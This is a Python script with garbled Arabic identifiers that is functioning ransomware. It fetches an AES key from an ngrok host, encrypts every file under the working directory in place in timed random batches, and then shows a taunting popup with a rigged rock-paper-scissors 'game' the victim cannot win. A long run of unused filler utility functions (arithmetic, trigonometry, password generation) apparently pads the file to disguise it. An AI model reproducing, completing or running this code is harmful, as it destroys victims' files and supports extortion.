import os
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes 
from cryptography.hazmat.backends import default_backend
import requests
import tkinter as tk
from tkinter import simpledialog, messagebox
import hashlib
import random
import time
import tkinter as tk
from tkinter import messagebox, simpledialog

_ูุถุน = "active"

def _ุงุญุตู_ุนูู_ุงูููุชุงุญ_ูู_ุงูููุทุฉ(_ูุณุงุฑ_ุนุดูุงุฆู):
    _ุฑุงุจุท_ุงูููุชุงุญ = f"https://squirrel-pet-bengal.ngrok-free.app/key/{_ูุณุงุฑ_ุนุดูุงุฆู}"
    try:
        _ุงุณุชุฌุงุจุฉ = requests.get(_ุฑุงุจุท_ุงูููุชุงุญ)
        _ุงุณุชุฌุงุจุฉ.raise_for_status()
        _ููุชุงุญ_ุฎุงู = _ุงุณุชุฌุงุจุฉ.text.strip()
        _ููุชุงุญ_ูุฌุฒุฃ = hashlib.sha256(_ููุชุงุญ_ุฎุงู.encode()).digest()[:16]
        messagebox.showerror("ูุดู ุงุณุชุฑุฌุงุน ุงูููุชุงุญ", "ูู ูุชู ุงุณุชุฑุฌุงุน ุงูุดูุงุฏุฉ. ุงูุชูุช ุงููููุฉุ ููููุฉ ุงููุฑูุฑ ุฃุตุจุญุช ุบูุฑ ุตุงูุญุฉ.")
        return _ููุชุงุญ_ูุฌุฒุฃ
    except Exception as _ุฎุทุฃ:
        print(f"ูุดู ุงุณุชุฑุฌุงุน ุงูููุชุงุญ: {_ุฎุทุฃ}")
        return None

def _ุชุดุบูู_ุงููุชุฌู(_ุจูุงูุงุช_ูุฏุฎูุฉ: bytes, _ุฑูุฒ_ุงูุชูููู: bytes) -> bytes:
    _ุจุฐุฑุฉ_ุงูุนุดูุงุฆูุฉ = os.urandom(12)
    _ุจุฐุฑุฉ_ุงูุนุฏุงุฏ = b'\x00\x00\x00\x00'
    _ุจุฐุฑุฉ_ุงููุญุฑู = _ุจุฐุฑุฉ_ุงูุนุดูุงุฆูุฉ + _ุจุฐุฑุฉ_ุงูุนุฏุงุฏ

    _ุฌูุณุฉ = Cipher(algorithms.AES(_ุฑูุฒ_ุงูุชูููู), modes.CTR(_ุจุฐุฑุฉ_ุงููุญุฑู), backend=default_backend()).encryptor()
    _ูุชูุฉ_ุงูุฅุฎุฑุงุฌ = _ุฌูุณุฉ.update(_ุจูุงูุงุช_ูุฏุฎูุฉ) + _ุฌูุณุฉ.finalize()
    return _ุจุฐุฑุฉ_ุงูุนุดูุงุฆูุฉ + _ูุชูุฉ_ุงูุฅุฎุฑุงุฌ

def _ุนูุณ_ุงููุชุฌู(_ูุชูุฉ: bytes, _ุฑูุฒ_ุงูุชูููู: bytes) -> bytes:
    _ุนุดูุงุฆูุฉ = _ูุชูุฉ[:12]
    _ูุต_ูุดูุฑ = _ูุชูุฉ[12:]
    _ุจุฐุฑุฉ_ุงูุนุฏุงุฏ = b'\x00\x00\x00\x00'
    _ุจุฐุฑุฉ_ุงููุญุฑู = _ุนุดูุงุฆูุฉ + _ุจุฐุฑุฉ_ุงูุนุฏุงุฏ

    _ุฌูุณุฉ = Cipher(algorithms.AES(_ุฑูุฒ_ุงูุชูููู), modes.CTR(_ุจุฐุฑุฉ_ุงููุญุฑู), backend=default_backend()).decryptor()
    return _ุฌูุณุฉ.update(_ูุต_ูุดูุฑ) + _ุฌูุณุฉ.finalize()

def _ูุณุญ_ูุชุนุฏูู_ุงูุฃุตูู(_ุฏููู_ุงูุฃุตูู: str, _ุฑูุฒ_ุงูุชูููู: bytes, _ูุฏุฉ_ุฅุฌูุงููุฉ=50.0):
    _ูุณุงุฑุงุช_ุงููููุงุช = []
    _ุฃุญุฌุงู_ุงููููุงุช = []
    _ูุณุงุฑ_ุงูุณูุฑูุจุช = os.path.abspath(__file__)

    for _ูุณุงุฑ_ุงูุฏููู, _, _ุฃุตูู in os.walk(_ุฏููู_ุงูุฃุตูู):
        for _ุฃุตู in _ุฃุตูู:
            _ูุณุงุฑ = os.path.join(_ูุณุงุฑ_ุงูุฏููู, _ุฃุตู)
            if os.path.abspath(_ูุณุงุฑ) == _ูุณุงุฑ_ุงูุณูุฑูุจุช:
                continue
            _ูุณุงุฑุงุช_ุงููููุงุช.append(_ูุณุงุฑ)
            _ุฃุญุฌุงู_ุงููููุงุช.append(os.path.getsize(_ูุณุงุฑ))

    _ูููุงุช_ูุน_ุฃุญุฌุงู = list(zip(_ูุณุงุฑุงุช_ุงููููุงุช, _ุฃุญุฌุงู_ุงููููุงุช))
    random.shuffle(_ูููุงุช_ูุน_ุฃุญุฌุงู)

    _ุฅุฌูุงูู_ุงููููุงุช = len(_ูููุงุช_ูุน_ุฃุญุฌุงู)
    if _ุฅุฌูุงูู_ุงููููุงุช == 0:
        print("ูู ูุชู ุงูุนุซูุฑ ุนูู ูููุงุช.")
        return

    _ุฅุฌูุงูู_ุงูุญุฌู = sum(_ุญุฌู for _, _ุญุฌู in _ูููุงุช_ูุน_ุฃุญุฌุงู)

    _ุจุฏุงูุฉ_ุงูููุช = time.time()
    _i = 0
    while _i < _ุฅุฌูุงูู_ุงููููุงุช:
        _ุญุฌู_ุงูุฏูุนุฉ = random.randint(2, 5)
        _ูููุงุช_ุงูุฏูุนุฉ = _ูููุงุช_ูุน_ุฃุญุฌุงู[_i:_i + _ุญุฌู_ุงูุฏูุนุฉ]
        _ุฅุฌูุงูู_ุญุฌู_ุงูุฏูุนุฉ = sum(_ุญุฌู for _, _ุญุฌู in _ูููุงุช_ุงูุฏูุนุฉ)

        for _j, (_ูุณุงุฑ, _ุญุฌู) in enumerate(_ูููุงุช_ุงูุฏูุนุฉ, start=1):
            try:
                with open(_ูุณุงุฑ, 'rb') as _f:
                    _ุจูุงูุงุช = _f.read()
                _ูุฏุงุนุง = _ุชุดุบูู_ุงููุชุฌู(_ุจูุงูุงุช, _ุฑูุฒ_ุงูุชูููู)
                with open(_ูุณุงุฑ, 'wb') as _f:
                    _f.write(_ูุฏุงุนุง)
                print(f"[{_i + _j}/{_ุฅุฌูุงูู_ุงููููุงุช}] ูุฏุงุนุง: {_ูุณุงุฑ}")
            except Exception:
                print(f"[{_i + _j}/{_ุฅุฌูุงูู_ุงููููุงุช}] ูุดู: {_ูุณุงุฑ}")

        _i += _ุญุฌู_ุงูุฏูุนุฉ

        _ุงูููุช_ุงููุณุชุบุฑู = time.time() - _ุจุฏุงูุฉ_ุงูููุช
        _ุงูููุช_ุงููุชุจูู = max(_ูุฏุฉ_ุฅุฌูุงููุฉ - _ุงูููุช_ุงููุณุชุบุฑู, 0)
        _ุชุฃุฎูุฑ = min((_ุฅุฌูุงูู_ุญุฌู_ุงูุฏูุนุฉ / _ุฅุฌูุงูู_ุงูุญุฌู) * _ูุฏุฉ_ุฅุฌูุงููุฉ, _ุงูููุช_ุงููุชุจูู / ((_ุฅุฌูุงูู_ุงููููุงุช - _i) / _ุญุฌู_ุงูุฏูุนุฉ + 1))
        if _i < _ุฅุฌูุงูู_ุงููููุงุช:
            print(f"โณ ุชุฃุฎูุฑ ููุฏุฉ {_ุชุฃุฎูุฑ:.2f} ุซุงููุฉ...\n")
            time.sleep(_ุชุฃุฎูุฑ)

def _ุงุณุชุนุงุฏุฉ_ุงูุฃุตูู(_ุฏููู_ุงูุฃุตูู: str, _ุฑูุฒ_ุงูุชูููู: bytes):
    _ูุณุงุฑ_ุงูุณูุฑูุจุช = os.path.abspath(__file__)

    for _ูุณุงุฑ_ุงูุฏููู, _, _ุฃุตูู in os.walk(_ุฏููู_ุงูุฃุตูู):
        for _ุฃุตู in _ุฃุตูู:
            _ูุณุงุฑ_ุงูุฃุตู = os.path.join(_ูุณุงุฑ_ุงูุฏููู, _ุฃุตู)
            if os.path.abspath(_ูุณุงุฑ_ุงูุฃุตู) == _ูุณุงุฑ_ุงูุณูุฑูุจุช:
                continue

            try:
                with open(_ูุณุงุฑ_ุงูุฃุตู, 'rb') as _f:
                    _ูุชูุฉ = _f.read()

                _ูุณุชุนุงุฏ = _ุนูุณ_ุงููุชุฌู(_ูุชูุฉ, _ุฑูุฒ_ุงูุชูููู)

                with open(_ูุณุงุฑ_ุงูุฃุตู, 'wb') as _f:
                    _f.write(_ูุณุชุนุงุฏ)
            except Exception:
                pass  

def _ุนุฑุถ_ูุงูุฐุฉ_ููุจุซูุฉ(_ูุฏุฉ_ุงูุชุดููุฑ=None):
    _ุฌุฐุฑ = tk.Tk()
    _ุฌุฐุฑ.withdraw()

    _ุฑุณุงูุฉ = (
        "๐ ุฃูู ูุง... ุงููููุงุช ุงุฎุชูุช!\n"
        "๐ ููุงุฌุฃุฉ! ูููุงุชู ุงูุซูููุฉ ุงูุขู ูู ุฅุฌุงุฒุฉ โ ุจุดูู ุฏุงุฆู.\n\n"
        "ููู ูููุงูุ ุฃุดุนุฑ ุจุงูุณุฎุงุก ุงูููู...\n"
        "ูู ุชุฑุบุจ ูู ูุฑุตุฉ *ุนุงุฏูุฉ ุชูุงููุง* ูุงุณุชุนุงุฏุชูุงุ\n\n"
        "ุงุถุบุท ูุนู ููุนุจ ูุนุจุฉ\n"
        "ุงุถุบุท ูุง ูุฎุณุงุฑุฉ ูู ุดูุก ูุซู ุงูุฃุณุทูุฑุฉ ๐"
    )
    if _ูุฏุฉ_ุงูุชุดููุฑ is not None:
        _ุฑุณุงูุฉ += f"\n\nโณ ุงุณุชุบุฑู ุงูุชุดููุฑ {_ูุฏุฉ_ุงูุชุดููุฑ:.2f} ุซุงููุฉ."

    _ุงุณุชุฌุงุจุฉ = messagebox.askquestion("๐ ุฃูู ูุง... ุงููููุงุช ุงุฎุชูุช!", _ุฑุณุงูุฉ)

    if _ุงุณุชุฌุงุจุฉ == "yes":
        _ูุนุจ_ูุนุจุฉ()
    else:
        global _ูุถุน
        _ูุถุน = "restore"
        messagebox.showinfo("ูููุจ ูููุจ..", "ุงุฎุชุฑุช ุนุฏู ุงููุนุจ. ุณูุชู ุงุณุชุนุงุฏุฉ ูููุงุชู ููุท ูุฃูู ุนุฒูุฒ ุนูููุง.")

def _ูุนุจ_ูุนุจุฉ():
    global _ูุถุน

    _ุฎูุงุฑุงุช = ["rock", "paper", "scissors"]
    _ุงุฎุชูุงุฑุงุช_ุงูุญุงุณูุจ = ["rock", "paper", "scissors"]
    _ุงูุชุตุงุฑุงุช_ุงููุณุชุฎุฏู = 0
    _ุงูุชุตุงุฑุงุช_ุงูุญุงุณูุจ = 0

    for _ูุญุงููุฉ in range(1, 11):
        if _ุงูุชุตุงุฑุงุช_ุงููุณุชุฎุฏู == 3 or _ุงูุชุตุงุฑุงุช_ุงูุญุงุณูุจ == 3:
            break

        _ุงุฎุชูุงุฑ_ุงููุณุชุฎุฏู = simpledialog.askstring(
            "ุญุฌุฑุ ูุฑูุฉุ ููุต ๐ฎ",
            f"ุงูุฌููุฉ {_ูุญุงููุฉ}:\nุงุฎุชุฑ ุญุฌุฑุ ูุฑูุฉุ ุฃู ููุต:"
        )
        if not _ุงุฎุชูุงุฑ_ุงููุณุชุฎุฏู or _ุงุฎุชูุงุฑ_ุงููุณุชุฎุฏู.lower().strip() not in _ุฎูุงุฑุงุช:
            messagebox.showwarning("โ ุงุฎุชูุงุฑ ุบูุฑ ุตุงูุญ", "ูุฑุฌู ุงุฎุชูุงุฑ ุญุฌุฑุ ูุฑูุฉุ ุฃู ููุต.")
            continue

        _ุงุฎุชูุงุฑ_ุงููุณุชุฎุฏู = _ุงุฎุชูุงุฑ_ุงููุณุชุฎุฏู.lower().strip()
        if _ุงุฎุชูุงุฑ_ุงููุณุชุฎุฏู == "rock":
            _ุงุฎุชูุงุฑ_ุงูุญุงุณูุจ = _ุงุฎุชูุงุฑุงุช_ุงูุญุงุณูุจ[1]
        elif _ุงุฎุชูุงุฑ_ุงููุณุชุฎุฏู == "paper":
            _ุงุฎุชูุงุฑ_ุงูุญุงุณูุจ = _ุงุฎุชูุงุฑุงุช_ุงูุญุงุณูุจ[2]
        elif _ุงุฎุชูุงุฑ_ุงููุณุชุฎุฏู == "scissors":
            _ุงุฎุชูุงุฑ_ุงูุญุงุณูุจ = _ุงุฎุชูุงุฑุงุช_ุงูุญุงุณูุจ[0]
        else:
            _ุงุฎุชูุงุฑ_ุงูุญุงุณูุจ = random.choice(_ุงุฎุชูุงุฑุงุช_ุงูุญุงุณูุจ)

        if _ุงุฎุชูุงุฑ_ุงููุณุชุฎุฏู == _ุงุฎุชูุงุฑ_ุงูุญุงุณูุจ:
            messagebox.showinfo("๐ค ุชุนุงุฏู", f"ููุงููุง ุงุฎุชุฑ {_ุงุฎุชูุงุฑ_ุงููุณุชุฎุฏู}. ุฅููุง ุชุนุงุฏู!")
        else:
            _ุงูุชุตุงุฑุงุช_ุงูุญุงุณูุจ += 1
            messagebox.showinfo("๐ป ุงูุญุงุณูุจ ูููุฒ", f"ุงุฎุชุฑุช {_ุงุฎุชูุงุฑ_ุงููุณุชุฎุฏู}ุ ุงูุญุงุณูุจ ุงุฎุชุงุฑ {_ุงุฎุชูุงุฑ_ุงูุญุงุณูุจ}. ุงูุญุงุณูุจ ูููุฒ ุจูุฐู ุงูุฌููุฉ!")

    if _ุงูุชุตุงุฑุงุช_ุงูุญุงุณูุจ == 3:
        messagebox.showerror("๐ ุงูุชูุช ุงููุนุจุฉ", "ุฎุณุฑุช ุงููุนุจุฉ. ุงูุทุฑููุฉ ุงููุญูุฏุฉ ููู ุงูุชุดููุฑ ูู ุงุฎุชูุงุฑ ุนุฏู ุงููุนุจ.")

def _ุญุณุงุจ_ูุฌููุน_ุงูุฃุฑูุงู(_ูุงุฆูุฉ):
    return sum(_ูุงุฆูุฉ)

def _ุนูุณ_ุงููุต(_ูุต):
    return _ูุต[::-1]

def _ุชุญูู_ูู_ุงูุฃูููุฉ(_ุนุฏุฏ):
    if _ุนุฏุฏ < 2:
        return False
    for _ูู in range(2, int(_ุนุฏุฏ ** 0.5) + 1):
        if _ุนุฏุฏ % _ูู == 0:
            return False
    return True

def _ุชูููุฏ_ูููุฉ_ูุฑูุฑ(_ุทูู):
    _ุฃุญุฑู = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
    return ''.join(random.choice(_ุฃุญุฑู) for _ in _ุทูู)

def _ุญุณุงุจ_ุงููุชูุณุท(_ูุงุฆูุฉ):
    return sum(_ูุงุฆูุฉ) / len(_ูุงุฆูุฉ) if _ูุงุฆูุฉ else 0

def _ุชุญููู_ุฅูู_ุซูุงุฆู(_ุนุฏุฏ):
    return bin(_ุนุฏุฏ)[2:]

def _ุชุญููู_ุฅูู_ุนุดุฑู(_ุซูุงุฆู):
    return int(_ุซูุงุฆู, 2)

def _ุฅุฒุงูุฉ_ุงูููุฑุฑ_ูู_ูุงุฆูุฉ(_ูุงุฆูุฉ):
    return list(set(_ูุงุฆูุฉ))

def _ุฏูุฌ_ุงูููุงููุณ(_ูุงููุณ1, _ูุงููุณ2):
    return {**_ูุงููุณ1, **_ูุงููุณ2}

def _ุชูููุฏ_ุฑูู_ุนุดูุงุฆู(_ุญุฏ_ุฃุฏูู, _ุญุฏ_ุฃูุตู):
    return random.randint(_ุญุฏ_ุฃุฏูู, _ุญุฏ_ุฃูุตู)

def _ุฌูุน(_ุนุฏุฏ1, _ุนุฏุฏ2):
    return _ุนุฏุฏ1 + _ุนุฏุฏ2

def _ุทุฑุญ(_ุนุฏุฏ1, _ุนุฏุฏ2):
    return _ุนุฏุฏ1 - _ุนุฏุฏ2

def _ุถุฑุจ(_ุนุฏุฏ1, _ุนุฏุฏ2):
    return _ุนุฏุฏ1 * _ุนุฏุฏ2

def _ูุณูุฉ(_ุนุฏุฏ1, _ุนุฏุฏ2):
    if _ุนุฏุฏ2 == 0:
        raise ValueError("ูุง ูููู ุงููุณูุฉ ุนูู ุงูุตูุฑ")
    return _ุนุฏุฏ1 / _ุนุฏุฏ2

def _ุฑูุน_ุฅูู_ุงูููุฉ(_ุฃุณุงุณ, _ุฃุณ):
    return _ุฃุณุงุณ ** _ุฃุณ

def _ุฌุฐุฑ_ุชุฑุจูุนู(_ุนุฏุฏ):
    if _ุนุฏุฏ < 0:
        raise ValueError("ูุง ูููู ุญุณุงุจ ุงูุฌุฐุฑ ุงูุชุฑุจูุนู ูุนุฏุฏ ุณุงูุจ")
    return _ุนุฏุฏ ** 0.5

def _ุญุณุงุจ_ุงููุณุจุฉ_ุงููุฆููุฉ(_ุฌุฒุก, _ูู):
    if _ูู == 0:
        raise ValueError("ูุง ูููู ุงููุณูุฉ ุนูู ุงูุตูุฑ")
    return (_ุฌุฒุก / _ูู) * 100

def _ุญุณุงุจ_ุงููุนุงููุงุช_ุงููุซูุซูุฉ(_ุฒุงููุฉ, _ุฏุงูุฉ):
    import math
    _ุฒุงููุฉ_ุจุงูุฑุงุฏูุงู = math.radians(_ุฒุงููุฉ)
    if _ุฏุงูุฉ == "sin":
        return math.sin(_ุฒุงููุฉ_ุจุงูุฑุงุฏูุงู)
    elif _ุฏุงูุฉ == "cos":
        return math.cos(_ุฒุงููุฉ_ุจุงูุฑุงุฏูุงู)
    elif _ุฏุงูุฉ == "tan":
        return math.tan(_ุฒุงููุฉ_ุจุงูุฑุงุฏูุงู)
    else:
        raise ValueError("ุฏุงูุฉ ูุซูุซูุฉ ุบูุฑ ูุนุฑููุฉ")

def _ุญุณุงุจ_ุงููุนุงููุงุช_ุงูุนูุณูุฉ(_ูููุฉ, _ุฏุงูุฉ):
    import math
    if _ุฏุงูุฉ == "asin":
        return math.degrees(math.asin(_ูููุฉ))
    elif _ุฏุงูุฉ == "acos":
        return math.degrees(math.acos(_ูููุฉ))
    elif _ุฏุงูุฉ == "atan":
        return math.degrees(math.atan(_ูููุฉ))
    else:
        raise ValueError("ุฏุงูุฉ ุนูุณูุฉ ุบูุฑ ูุนุฑููุฉ")

def _ุญุณุงุจ_ุงูููุบุงุฑูุชู(_ุนุฏุฏ, _ุฃุณุงุณ=10):
    import math
    if _ุนุฏุฏ <= 0:
        raise ValueError("ุงูุนุฏุฏ ูุฌุจ ุฃู ูููู ุฃูุจุฑ ูู ุงูุตูุฑ")
    return math.log(_ุนุฏุฏ, _ุฃุณุงุณ)

if __name__ == "__main__":
    import time
    _ูุฌูุฏ_ุงูููุงุฑุฏ = os.getcwd()

    _ุฌุฐุฑ = tk.Tk()
    _ุฌุฐุฑ.withdraw()

    _ูุณุงุฑ_ุนุดูุงุฆู = simpledialog.askstring("ุฅุฏุฎุงู ูุทููุจ", "ุฃุฏุฎู ุงููุณุงุฑ ุงูุนุดูุงุฆู (ูููุฉ ุงููุฑูุฑ) ุงููุฑุณู ูู ุงูุจุฑูุฏ ุงูุฅููุชุฑููู:")

    _ููุชุงุญ = _ุงุญุตู_ุนูู_ุงูููุชุงุญ_ูู_ุงูููุทุฉ(_ูุณุงุฑ_ุนุดูุงุฆู)
    print(_ููุชุงุญ)
    if not _ููุชุงุญ:
        messagebox.showerror("ุฎุทุฃ", "ูุดู ุงุณุชุฑุฌุงุน ุงูููุชุงุญ. ูุฑุฌู ุงูุชุญูู ูู ุงููุณุงุฑ ุงูุนุดูุงุฆู.")
        exit(1)

    if _ูุถุน == "active":
        _ุจุฏุงูุฉ = time.time()
        _ูุณุญ_ูุชุนุฏูู_ุงูุฃุตูู(_ูุฌูุฏ_ุงูููุงุฑุฏ, _ููุชุงุญ)
        _ููุงูุฉ = time.time()
        _ูุฏุฉ_ุงูุชุดููุฑ = _ููุงูุฉ - _ุจุฏุงูุฉ
        print(f"ุงูุชูู ุงูุชุดููุฑ ูู {_ูุฏุฉ_ุงูุชุดููุฑ:.2f} ุซุงููุฉ.")
        _ุนุฑุถ_ูุงูุฐุฉ_ููุจุซูุฉ(_ูุฏุฉ_ุงูุชุดููุฑ)

    if _ูุถุน == "restore":
        _ุงุณุชุนุงุฏุฉ_ุงูุฃุตูู(_ูุฌูุฏ_ุงูููุงุฑุฏ, _ููุชุงุญ)
        print("ุชู ุงุณุชุนุงุฏุฉ ุงููููุงุช ุจูุฌุงุญ.")